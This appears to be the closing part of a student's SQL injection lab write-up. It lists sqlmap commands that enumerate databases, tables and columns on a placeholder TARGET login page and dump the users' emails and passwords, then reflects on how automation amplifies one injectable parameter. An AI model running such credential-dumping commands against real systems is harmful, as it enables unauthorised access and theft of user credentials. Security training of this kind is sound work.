Commands Used
sqlmap -u 'http://TARGET/ai/includes/user_login?email=test&password=test' --dbs --level=5
sqlmap -u 'http://TARGET/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5
sqlmap -u 'http://TARGET/ai/includes/user_login?email=test&password=test' -D ai -T users --columns --level=5
sqlmap -u 'http://TARGET/ai/includes/user_login?email=test&password=test' -D ai -T users -C email,password --dump --level=5
Reflection

This lab made SQL injection feel much more tangible.

Before this, SQL injection mostly existed in my head as one of those vulnerabilities everyone talks about constantly, but seeing SQLMap identify multiple injection types and progressively expose the backend structure made the impact much clearer.

What surprised me most was how quickly automation changes the scale of a vulnerability once an entry point exists.

One injectable parameter exposed:

backend technologies
database information
table structures
current DB user
user credentials

This also connected strongly with ideas I’ve been thinking about while building accguard.

Even though Broken Access Control and SQL Injection are different vulnerability classes, the underlying lesson feels similar: once trust boundaries fail, automation can massively amplify impact. A small weakness can quickly become broad unintended access.

Another important takeaway was realizing that understanding the flags matters just as much as running the tool itself. SQLMap automates exploitation, but understanding why --dbs, --tables, --columns, --dump, --level, and --risk exist makes the process far more meaningful.

The technical concepts themselves were manageable, but staying patient while reading the output carefully mattered a lot. Skimming terminal output usually creates confusion later.

One vulnerable parameter can become full database visibility faster than expected.

